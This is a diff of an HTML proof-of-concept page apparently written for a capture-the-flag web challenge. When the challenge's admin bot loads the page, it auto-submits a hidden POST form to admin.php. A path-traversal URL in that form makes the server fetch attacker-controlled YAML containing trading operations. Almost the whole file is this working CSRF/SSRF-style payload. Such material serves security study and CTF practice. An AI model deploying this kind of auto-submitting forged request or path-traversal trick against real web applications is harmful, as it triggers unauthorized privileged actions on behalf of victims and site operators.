@@ -1,9 +1,41 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0;url=http://localhost:5000/admin.php?url=http://localhost:5000/index.php?html=-%20op:%20SELL%0A%20%20amount:%201%0A%20%20currency:%20FL">
+  <meta charset="utf-8" />
+  <title>Cute CSP PoC</title>
 </head>
 <body>
-    <p>Redirecting...</p>
+  <!--
+    This page will be loaded by the challenge bot.
+    Once loaded, it auto-submits a POST request to /admin.php
+    with a crafted "url" parameter that points to YAML we control.
+  -->
+
+  <form id="poc" method="POST" action="http://localhost:5000/admin.php">
+    <input type="hidden" name="url" id="payload" value="">
+    <noscript>
+      <button type="submit">Submit</button>
+    </noscript>
+  </form>
+
+  <script>
+    // YAML we want the server to parse
+    const yaml = `- op: BUY
+  amount: 1
+  currency: US
+- op: SELL
+  amount: 1
+  currency: US
+- op: BUY
+  amount: 1
+  currency: FL`;
+
+    // Trick admin.php into fetching our YAML via index.php
+    const target = "http://localhost:5000/admin.php/../index.php?html=" + encodeURIComponent(yaml);
+
+    // Fill hidden field and auto-submit
+    document.getElementById('payload').value = target;
+    setTimeout(() => document.getElementById('poc').submit(), 200);
+  </script>
 </body>
 </html>
